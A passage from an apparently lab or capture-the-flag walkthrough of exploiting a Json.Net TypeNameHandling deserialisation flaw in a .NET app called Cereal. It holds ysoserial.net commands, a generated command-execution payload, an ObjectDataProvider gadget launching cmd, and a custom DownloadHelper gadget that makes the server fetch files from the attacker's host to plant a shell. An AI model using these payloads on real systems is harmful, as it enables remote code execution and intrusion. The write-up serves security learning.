# Deserialisation

Now we can create a cereal, we want to make one that leverages the deserialisation vulnerability.

I searched ".net deserialisation" in Google and immediately found the following [Medium article](https://medium.com/@frycos/yet-another-net-deserialization-35f6ce048df7). It mentions `TypeNameHandling` vulnerabilities, so I did some more digging into how these work.

I found the following posts:
- https://stackoverflow.com/questions/49038055/external-json-vulnerable-because-of-json-net-typenamehandling-auto/49040862
- https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html

They talk about insecure JSON conversions leading to deserialisation vulnerabilities - sure enough, `Controllers/RequestsController.cs` has the following code:

![[Pasted image 20210607210556.png]]

Essentially, the vulnerability allows overwriting the type of the object when it is parsed from JSON. It *should* be turned into a `Cereal` object - but if we supply a `$type` field in our JSON, we can create an object of any other class, as the `TypeNameHandling.Auto` call parses it automatically.

Now we need to find a gadget that allows for Remote Code Execution - i.e. a class on the project's classpath that executes code in one of its constructor or setter methods.

## ysoserial.net

*Note:* as always, I'll detail my thought process - but this technique did not actually work, so you can skip to me [[25 - Deserialisation#Custom Gadget Chain|finding the correct gadget]] if you wish.

What do you know? Here we have a .NET based Gadget Chain finder, similar to the original [ysoserial](https://github.com/frohoff/ysoserial)...

https://github.com/pwntester/ysoserial.net

This is the tool spotted in the "Security fixes" commit earlier - when I saw this line in the code, I initially misread it as blocking payloads from the `frohoff` repository, and thought the one I found would bypass the defences. I realised my mistake, but still wanted to try and create a payload just to check the defence was sound.

The reference to `ClaimsIdentity` on the usage page immediately stands out. This is imported in the `using System.Security.Claims;` line in `Services/UserService.cs` and used to generate claims for the JWT tokens. I initially assumed as it was not explicitly *named* in the classes that are blacklisted in the security check, we may be able to use it to gain code execution. I would have saved a lot of time if I'd paid attention to the catch-all of classes in the `System` namespace. But let's explore what I tried, so we can understand what the process would be if there was no blacklist.

First, we install the zip from the README in the git repo, then unzip it into `/opt`:

```bash
┌──(mac㉿kali)-[~]
└─$ sudo cp Downloads/ysoserial-1.34.zip /opt/
[sudo] password for mac: 
┌──(mac㉿kali)-[~]
└─$ cd /opt/
┌──(mac㉿kali)-[/opt]
└─$ sudo unzip ysoserial-1.34.zip 
Archive:  ysoserial-1.34.zip
   creating: Release/
...[snip]...
┌──(mac㉿kali)-[/opt]
└─$ sudo mv Release/ ysoserial-dotnet
```

I tried to use `mono` to run the exe, as per the docs in the repo:

```bash
┌──(mac㉿kali)-[/opt/ysoserial-dotnet]
└─$ mono ysoserial.exe -f BinaryFormatter -g ClaimsIdentity -c 'ping 10.10.14.62'

Unhandled Exception:
System.IO.FileNotFoundException: Could not load file or assembly 'PresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35' or one of its dependencies.
File name: 'PresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'
  at ysoserial.Generators.GenericGenerator.GenerateWithInit (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x00007] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Generators.GenericGenerator.GenerateWithNoTest (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x0000e] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Generators.ClaimsIdentityGenerator.Generate (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x00005] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Generators.GenericGenerator.GenerateWithInit (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x00007] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Program.Main (System.String[] args) [0x004e9] in <0547cad762af461984c6f953f3fc4858>:0 
[ERROR] FATAL UNHANDLED EXCEPTION: System.IO.FileNotFoundException: Could not load file or assembly 'PresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35' or one of its dependencies.
File name: 'PresentationCore, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35'
  at ysoserial.Generators.GenericGenerator.GenerateWithInit (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x00007] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Generators.GenericGenerator.GenerateWithNoTest (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x0000e] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Generators.ClaimsIdentityGenerator.Generate (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x00005] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Generators.GenericGenerator.GenerateWithInit (System.String formatter, ysoserial.Helpers.InputArgs inputArgs) [0x00007] in <0547cad762af461984c6f953f3fc4858>:0 
  at ysoserial.Program.Main (System.String[] args) [0x004e9] in <0547cad762af461984c6f953f3fc4858>:0 
```

At this point I figured it would be much easier to run it on Windows than via mono, so I hopped over to my host machine.

On Windows, after downloading the release and unzipping it, I can create a payload to ping my Kali Virtual Machine as follows:

```cmd
D:\ysoserial-1.34\Release>ysoserial.exe -f BinaryFormatter -g ClaimsIdentity -c 'ping 10.10.14.62'
AAEAAAD/////AQAAAAAAAAAEAQAAACVTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc0lkZW50aXR5AQAAABJtX3NlcmlhbGl6ZWRDbGFpbXMBBgUAAADECUFBRUFBQUQvLy8vL0FRQUFBQUFBQUFBTUFnQUFBRjVOYVdOeWIzTnZablF1VUc5M1pYSlRhR1ZzYkM1RlpHbDBiM0lzSUZabGNuTnBiMjQ5TXk0d0xqQXVNQ3dnUTNWc2RIVnlaVDF1WlhWMGNtRnNMQ0JRZFdKc2FXTkxaWGxVYjJ0bGJqMHpNV0ptTXpnMU5tRmtNelkwWlRNMUJRRUFBQUJDVFdsamNtOXpiMlowTGxacGMzVmhiRk4wZFdScGJ5NVVaWGgwTGtadmNtMWhkSFJwYm1jdVZHVjRkRVp2Y20xaGRIUnBibWRTZFc1UWNtOXdaWEowYVdWekFRQUFBQTlHYjNKbFozSnZkVzVrUW5KMWMyZ0JBZ0FBQUFZREFBQUFzd1U4UDNodGJDQjJaWEp6YVc5dVBTSXhMakFpSUdWdVkyOWthVzVuUFNKMWRHWXRPQ0kvUGcwS1BFOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNpQk5aWFJvYjJST1lXMWxQU0pUZEdGeWRDSWdTWE5KYm1sMGFXRnNURzloWkVWdVlXSnNaV1E5SWtaaGJITmxJaUI0Yld4dWN6MGlhSFIwY0RvdkwzTmphR1Z0WVhNdWJXbGpjbTl6YjJaMExtTnZiUzkzYVc1bWVDOHlNREEyTDNoaGJXd3ZjSEpsYzJWdWRHRjBhVzl1SWlCNGJXeHVjenB6WkQwaVkyeHlMVzVoYldWemNHRmpaVHBUZVhOMFpXMHVSR2xoWjI1dmMzUnBZM003WVhOelpXMWliSGs5VTNsemRHVnRJaUI0Yld4dWN6cDRQU0pvZEhSd09pOHZjMk5vWlcxaGN5NXRhV055YjNOdlpuUXVZMjl0TDNkcGJtWjRMekl3TURZdmVHRnRiQ0krRFFvZ0lEeFBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSXVUMkpxWldOMFNXNXpkR0Z1WTJVK0RRb2dJQ0FnUEhOa09sQnliMk5sYzNNK0RRb2dJQ0FnSUNBOGMyUTZVSEp2WTJWemN5NVRkR0Z5ZEVsdVptOCtEUW9nSUNBZ0lDQWdJRHh6WkRwUWNtOWpaWE56VTNSaGNuUkpibVp2SUVGeVozVnRaVzUwY3owaUwyTWdKM0JwYm1jaUlGTjBZVzVrWVhKa1JYSnliM0pGYm1OdlpHbHVaejBpZTNnNlRuVnNiSDBpSUZOMFlXNWtZWEprVDNWMGNIVjBSVzVqYjJScGJtYzlJbnQ0T2s1MWJHeDlJaUJWYzJWeVRtRnRaVDBpSWlCUVlYTnpkMjl5WkQwaWUzZzZUblZzYkgwaUlFUnZiV0ZwYmowaUlpQk1iMkZrVlhObGNsQnliMlpwYkdVOUlrWmhiSE5sSWlCR2FXeGxUbUZ0WlQwaVkyMWtJaUF2UGcwS0lDQWdJQ0FnUEM5elpEcFFjbTlqWlhOekxsTjBZWEowU1c1bWJ6NE5DaUFnSUNBOEwzTmtPbEJ5YjJObGMzTStEUW9nSUR3dlQySnFaV04wUkdGMFlWQnliM1pwWkdWeUxrOWlhbVZqZEVsdWMzUmhibU5sUGcwS1BDOVBZbXBsWTNSRVlYUmhVSEp2ZG1sa1pYSStDdz09Cw==
```

However, this uses the `BinaryFormatter` and I would ideally like to use the `Json.Net` formatter.

The only gadgets that support this formatter are as follows:

```bash
┌──(mac㉿kali)-[/opt]
└─$ cat ysoserial.net/README.md | grep Json.Net -B 1
	(*) ObjectDataProvider (supports extra options: use the '--fullhelp' argument to view)
		Formatters: DataContractSerializer (2) , FastJson , FsPickler , JavaScriptSerializer , Json.Net , SharpSerializerBinary , SharpSerializerXml , Xaml (4) , XmlSerializer (2) , YamlDotNet < 5.0.0
--
	(*) RolePrincipal
		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
	(*) SessionSecurityToken
		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
	(*) SessionViewStateHistoryItem
		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
--
	(*) WindowsClaimsIdentity [Requires Microsoft.IdentityModel.Claims namespace (not default GAC)] (supports extra options: use the '--fullhelp' argument to view)
		Formatters: BinaryFormatter (3) , DataContractSerializer (2) , Json.Net (2) , LosFormatter (3) , NetDataContractSerializer (3) , SoapFormatter (2)
	(*) WindowsIdentity
		Formatters: BinaryFormatter , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
	(*) WindowsPrincipal
		Formatters: BinaryFormatter , DataContractJsonSerializer , DataContractSerializer , Json.Net , LosFormatter , NetDataContractSerializer , SoapFormatter
```

Of these, two are included in the security check (`ObjectDataProvider` and `WindowsClaimsIdentity`), and the others are not on the classpath for the project. 

The security check also looks for the word `system`, which rules out the gadgets `System.Web.Security.RolePrincipal`, `System.IdentityModel.Tokens.SessionSecurityToken`, and `System.Security.WindowsPrincipal`  even if they were on the classpath. I couldn't find the namespace that contains `SessionViewStateHistoryItem`, but [this example](https://referencesource.microsoft.com/#System.Web.Mobile/UI/MobileControls/SessionViewState.cs) makes use of the class and imports entirely `System` libraries, so it would be blocked.

While I could have saved some time by trusting the security fix correctly blocked all 	`ysoserial.net` payloads, I think it was worth doing my due diligence and making sure that none of these gadgets were exploitable. It also taught me a bit more about gadget chains in an unfamiliar language.

However, this makes me sure the defence will work. Instead, I will have to come up with a custom gadget chain.

## Custom Gadget Chain

The relevant controller at `Controllers/RequestsController.cs` uses the following libraries:

```csharp
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Authorization;
using System.Linq;
using Cereal.Models;
using Cereal.Services;
using Newtonsoft.Json;
using System;
```

The four classes in `Models` have no vulnerable looking code - just some gets and sets. I could potentially create a `User` object, but it wouldn't be inserted into the database and even if it were, it would only grant me access to the admin panel.

The only class in `Services` is `Services/UserService.cs`. This doesn't have an overloaded constructor or any get/set methods, and all the variables within the `Authenticate` method are set within the method anyway, so I don't think they would be vulnerable.

However, `Services/UserService.cs` imports a new set of classes that wasn't present in `Controllers/RequestsController.cs`:

```csharp
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Linq;
using System.Security.Claims;
using System.Text;
using Microsoft.Extensions.Options;
using Microsoft.IdentityModel.Tokens;
using Cereal.Models;
using Cereal.Helpers;
```

It references the `Cereal.Helpers` library. There was no `Helpers` folder, so I did a global search for "helper" in vscode and found something that had been staring me in the face, in the top level of the repository - the `DownloadHelper.cs` class.

This has a `Download()` method that is called in the `set` methods for the `URL` and `Filepath` variables:

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Threading.Tasks;

namespace Cereal
{
    public class DownloadHelper
    {
        private String _URL;
        private String _FilePath;
        public String URL
        {
            get { return _URL; }
            set
            {
                _URL = value;
                Download();
            }
        }
        public String FilePath
        {
            get { return _FilePath; }
            set
            {
                _FilePath = value;
                Download();
            }
        }
        private void Download()
        {
            using (WebClient wc = new WebClient())
            {
                if (!string.IsNullOrEmpty(_URL) && !string.IsNullOrEmpty(_FilePath))
                {
                    wc.DownloadFile(_URL, _FilePath);
                }
            }
        }
    }
}
```

If they are both set, a `WebClient.DownloadFile` call is made. According to [its documentation](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-5.0), this method "downloads to a local file data from the URI specified". We can probably use this to upload a shell to the box.

However, `DownloadHelper.cs` is not in the `Cereal.Helpers` namespace (the only class that is being `ExtensionMethods.cs`, which doesn't look useful). I am hoping that, as a result of it being just in the `Cereal` namespace, it will automatically be on the classpath. I am not super familiar with the subtleties of C#, but I will take that assumption and run with it for now.

### Crafting a Payload

I'm going to look at an example from `ysoserial.net` and replicate its structure, replacing the class with the `DownloadHelper` class.

```bash
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd','/ccalc']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}
```

It looks like we need to specify the class in the `$type` field, as suggested by the initial article by @frycos, and then set our variables. We will create a test payload for now, and then attempt to make one to download a shell.

I'm unsure the purpose of the `PresentationFramework, Version=...` strings, so I'll look for some documentation on the `Json.Net` formatter and see if it sheds some light on how to call a constructor.

I searched "Json.Net constructor", and found the following: https://stackoverflow.com/questions/23017716/json-net-how-to-deserialize-without-using-the-default-constructor

This suggests that the constructor is the default method that is called when the object is deserialised - this is good. How exactly I call the set methods, however, is unclear.

This [newtonsoft documentation](https://www.newtonsoft.com/json/help/html/DeserializeObject.htm) suggests it is as simple as naming the variables in the JSON. This is the first payload I tried:

```bash
{
	'$type':'Cereal.DownloadHelper',
	'_URL':'http://10.10.14.62/',
	'_FilePath':'test'
}
```

When this JSON is parsed by the `JsonConvert.DeserialiseObject()` call in `Controllers/RequestsController.cs`, it should get deserialised and request the file `test` from our box.

This turned out to not be quite right - but to test it, I had to first find a way to request it. It's time to look at some XSS.